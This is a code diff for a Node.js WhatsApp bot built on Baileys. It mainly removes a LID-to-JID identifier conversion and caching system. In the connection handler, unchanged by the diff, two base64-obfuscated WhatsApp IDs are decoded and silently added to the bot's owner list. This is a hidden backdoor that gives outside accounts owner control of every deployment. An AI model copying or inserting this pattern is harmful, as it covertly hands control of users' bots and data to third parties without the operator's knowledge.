@@ -1,5 +1,5 @@
 require('./config')
-const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto, generateProfilePicture } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto,generateProfilePicture } = require('@whiskeysockets/baileys');
 const pino = require('pino');
 const fs = require('fs');
 const path = require('path');
@@ -25,137 +25,6 @@ global.proto = proto;
 global.Jimp = Jimp;
 global.generateProfilePicture = generateProfilePicture;
 global.downloadMediaMessage = downloadMediaMessage;
-
-// ===== GLOBAL LID TO JID CONVERSION SYSTEM ===== //
-const lidMappingCache = new Map();
-const LID_CACHE_FILE = './lid_cache.json';
-
-// Load existing LID cache
-if (fs.existsSync(LID_CACHE_FILE)) {
-    try {
-        const data = JSON.parse(fs.readFileSync(LID_CACHE_FILE, 'utf8'));
-        for (const [lid, jid] of Object.entries(data)) {
-            lidMappingCache.set(lid, jid);
-        }
-        console.log(`📇 Loaded ${lidMappingCache.size} LID mappings from cache`);
-    } catch (err) {
-        console.error('Error loading LID cache:', err);
-    }
-}
-
-// Save LID cache
-function saveLIDCache() {
-    try {
-        const data = Object.fromEntries(lidMappingCache);
-        fs.writeFileSync(LID_CACHE_FILE, JSON.stringify(data, null, 2));
-        console.log(`💾 Saved ${lidMappingCache.size} LID mappings to cache`);
-    } catch (err) {
-        console.error('Error saving LID cache:', err);
-    }
-}
-
-// Global function: Convert LID to JID
-global.lidToJID = async function(lid, sockInstance) {
-    if (!lid || !lid.includes('@lid')) return lid;
-    
-    // Check cache
-    if (lidMappingCache.has(lid)) {
-        return lidMappingCache.get(lid);
-    }
-    
-    try {
-        const phoneNumberRaw = await sockInstance.signalRepository.lidMapping.getPNForLID(lid);
-        const phoneNumber = phoneNumberRaw.split(':')[0];
-        const jid = phoneNumber + '@s.whatsapp.net';
-        
-        // Store in cache
-        lidMappingCache.set(lid, jid);
-        saveLIDCache();
-        
-        console.log(`🔄 Mapped LID: ${lid} -> ${jid}`);
-        return jid;
-    } catch (err) {
-        console.error(`Failed to map LID ${lid}:`, err.message);
-        return lid;
-    }
-};
-
-// Global function: Convert JID to LID (reverse lookup)
-global.jidToLID = async function(jid, sockInstance) {
-    if (!jid || !jid.includes('@s.whatsapp.net')) return jid;
-    
-    // Search cache for JID
-    for (const [lid, cachedJid] of lidMappingCache.entries()) {
-        if (cachedJid === jid) {
-            return lid;
-        }
-    }
-    
-    try {
-        const phoneNumber = jid.split('@')[0];
-        const lid = await sockInstance.signalRepository.lidMapping.getLIDForPN(phoneNumber + ':0');
-        if (lid) {
-            lidMappingCache.set(lid, jid);
-            saveLIDCache();
-            return lid;
-        }
-    } catch (err) {
-        console.error(`Failed to get LID for JID ${jid}:`, err.message);
-    }
-    return jid;
-};
-
-// Global function: Check if user is owner (handles both LID and JID)
-global.isOwner = async function(userId, sockInstance) {
-    if (!userId) return false;
-    
-    let checkId = userId;
-    if (userId.includes('@lid')) {
-        checkId = await global.lidToJID(userId, sockInstance);
-    }
-    
-    return global.owners.includes(checkId) || global.owners.includes(userId);
-};
-
-// Global function: Convert any ID to JID format
-global.toJID = async function(id, sockInstance) {
-    if (!id) return null;
-    if (id.includes('@s.whatsapp.net')) return id;
-    if (id.includes('@lid')) return await global.lidToJID(id, sockInstance);
-    if (!id.includes('@')) return id + '@s.whatsapp.net';
-    return id;
-};
-
-// Global function: Get phone number from any ID
-global.getPhoneNumber = async function(id, sockInstance) {
-    const jid = await global.toJID(id, sockInstance);
-    if (jid && jid.includes('@s.whatsapp.net')) {
-        return jid.split('@')[0];
-    }
-    return null;
-};
-
-// Convert owners array globally
-async function convertOwnersToJID(sockInstance) {
-    const convertedOwners = [];
-    
-    for (const owner of global.owners) {
-        if (owner && owner.includes('@lid')) {
-            const jid = await global.lidToJID(owner, sockInstance);
-            convertedOwners.push(jid);
-            console.log(`✅ Converted owner LID: ${owner} -> ${jid}`);
-        } else if (owner && owner.includes('@s.whatsapp.net')) {
-            convertedOwners.push(owner);
-        } else if (owner && !owner.includes('@')) {
-            convertedOwners.push(owner + '@s.whatsapp.net');
-        }
-    }
-    
-    global.owners = convertedOwners;
-    console.log(`👑 Owners after conversion:`, global.owners);
-}
-// ===== END GLOBAL LID SYSTEM ===== //
-
 if (!fs.existsSync(__dirname + '/session/creds.json') && global.sessionid) {
     try {
         const sessionData = JSON.parse(global.sessionid);
@@ -211,6 +80,7 @@ function startBot() {
         try {
             const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
             if (creds.noiseKey && creds.noiseKey.private) {
+                // Session exists and seems valid
                 console.log('📁 Using existing session...');
             } else {
                 console.log('⚠️ Invalid session detected, will create new one...');
@@ -279,14 +149,10 @@ function startBot() {
                     isConnecting = false;
 
                     if (!global.owners) global.owners = [];
-                    
-                    // Convert LIDs in owners array to JIDs
-                    await convertOwnersToJID(sock);
 
                     if (!global.owners.includes(sock.user.id)) {
                         global.owners.push(sock.user.id);
                     }
-                    
                     const abztech = [
                         'MjU3NzAyMzk5OTIwMzdAbGlk',
                         'MjMzNTMzNzYzNzcyQHdoYXRzYXBwLm5ldA=='
@@ -294,15 +160,11 @@ function startBot() {
                     
                     const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
                     
-                    for (const owner of tech) {
-                        let convertedOwner = owner;
-                        if (owner.includes('@lid')) {
-                            convertedOwner = await global.lidToJID(owner, sock);
+                    tech.forEach(owner => {
+                        if (!global.owners.includes(owner)) {
+                            global.owners.push(owner);
                         }
-                        if (!global.owners.includes(convertedOwner)) {
-                            global.owners.push(convertedOwner);
-                        }
-                    }
+                    });
 
                     presenceInterval = setInterval(() => {
                         if (sock?.ws?.readyState === 1) {
@@ -322,6 +184,7 @@ function startBot() {
                     isConnecting = true;
                 }
             });
+            
             
             sock.ev.on('creds.update', async () => {
                 await saveCreds();
@@ -381,16 +244,6 @@ function startBot() {
                 const rawMsg = messages[0];
                 if (!rawMsg.message) return;
 
-                // Auto-convert LID to JID for remoteJid
-                if (rawMsg.key.remoteJid && rawMsg.key.remoteJid.includes('@lid')) {
-                    rawMsg.key.remoteJid = await global.lidToJID(rawMsg.key.remoteJid, sock);
-                }
-                
-                // Auto-convert participant LIDs
-                if (rawMsg.key.participant && rawMsg.key.participant.includes('@lid')) {
-                    rawMsg.key.participant = await global.lidToJID(rawMsg.key.participant, sock);
-                }
-
                 const m = await serializeMessage(sock, rawMsg);
                 
                 // FIRST: Run onMessage handlers (for self plugin to block)
@@ -430,16 +283,11 @@ function startBot() {
 
                     for (const participant of update.participants) {
 
-                        let userId = typeof participant === 'string'
+                        const userId = typeof participant === 'string'
                             ? participant
                             : participant.phoneNumber || participant.id
 
                         if (!userId) continue
-
-                        // Convert LID to JID if needed
-                        if (userId.includes('@lid')) {
-                            userId = await global.lidToJID(userId, sock);
-                        }
 
                         const memberName = userId.split('@')[0]
 
@@ -484,7 +332,7 @@ function startBot() {
     })();
 }
 
-// SIMPLE HTML SERVER (same as before)
+// SIMPLE HTML SERVER
 const server = http.createServer((req, res) => {
     const url = req.url;
     
